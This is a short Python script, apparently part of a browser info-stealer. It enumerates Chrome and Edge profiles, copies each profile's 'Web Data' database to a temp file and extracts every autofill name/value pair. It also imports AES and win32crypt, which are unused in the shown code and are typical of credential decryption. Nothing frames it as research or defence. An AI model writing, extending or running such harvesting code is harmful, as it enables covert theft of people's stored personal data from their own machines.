import os
import shutil
import sqlite3
from Crypto.Cipher import AES 
import json
import base64
import win32crypt
import datetime

LOCAL = os.getenv("LOCALAPPDATA")
PATHS = {
    'Chrome': os.path.join(LOCAL, 'Google', 'Chrome', 'User Data'),
    'Microsoft Edge': os.path.join(LOCAL, 'Microsoft', 'Edge', 'User Data'),
}

def pro():
    profiles = {}
    for browser, base_path in PATHS.items():
        found = []
        if os.path.exists(base_path):
            for entry in os.listdir(base_path):
                profile_path = os.path.join(base_path, entry)
                if os.path.isdir(profile_path) and (
                    entry == "Default" or entry.startswith("Profile")
                ):
                    found.append(profile_path)
        profiles[browser] = found
    return profiles

def autofill():
    res = []
    profiles = pro()

    for browser, profile_paths in profiles.items():
        for profile_path in profile_paths:
            db_path = os.path.join(profile_path, "Web Data")
            if not os.path.exists(db_path):
                continue

            tmp_db = os.path.join(os.getenv("TEMP"), "tmp_web_data.db")
            try:
                shutil.copy2(db_path, tmp_db)
                conn = sqlite3.connect(tmp_db)
                cursor = conn.cursor()

                cursor.execute("SELECT name, value FROM autofill")

                for name, value in cursor.fetchall():
                    if name or value:
                        res.append({
                            "browser": browser,
                            "profile": os.path.basename(profile_path),
                            "name": name,
                            "value": value,
                        })

                cursor.close()
                conn.close()
            except Exception as e:
                res.append({"error": str(e)})
            finally:
                if os.path.exists(tmp_db):
                    os.remove(tmp_db)

    return res
